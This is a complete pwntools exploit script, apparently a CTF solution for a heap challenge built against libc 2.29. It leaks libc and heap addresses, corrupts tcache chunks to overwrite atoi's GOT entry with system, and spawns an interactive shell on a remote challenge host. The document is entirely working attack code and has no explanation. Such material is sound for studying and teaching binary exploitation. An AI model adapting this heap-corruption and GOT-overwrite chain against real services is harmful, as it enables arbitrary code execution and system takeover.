from pwn import*
def new(size,content):
	p.sendlineafter('choice:','1')
	p.sendlineafter('house:',str(size))
	p.sendafter('your house:',content)
def show(index):
	p.sendlineafter('choice:','3')
	p.sendlineafter('index:',str(index))
def free(index):
	p.sendlineafter('choice:','4')
	p.sendlineafter('index:',str(index))
p = process('./main')
p = remote('das.wetolink.com',28499)
elf =ELF('./main')
libc = ELF('./libc-2.29.so',checksec=False)
for i in range(5):
	new(0x10,'/bin/sh\x00')
for i in range(3,-1,-1):
	free(i)
new(0x10,p64(elf.got['__libc_start_main']))
show(1)
p.recvuntil('house:\n')
libc_base = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00')) - libc.sym['__libc_start_main']
log.info('LIBC:\t' + hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
malloc_hook = libc_base + libc.sym['__malloc_hook']
system = libc_base + libc.sym['system']
rce = libc_base +0xe2383
show(2)
p.recvuntil('house:\n')
heap_base = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00')) - 0x320
log.info('HEAP:\t'+ hex(heap_base))
free(4)
free(5)
free(0)
new(0x10,'FMYY')
new(0x10,'FMYY')
new(0x10,'FMYY')
new(0x10,p64(elf.got['atoi']))
new(0x60,'FMYY')
new(0x10,p64(system))
p.sendlineafter('choice:','/bin/sh\x00')
p.interactive()


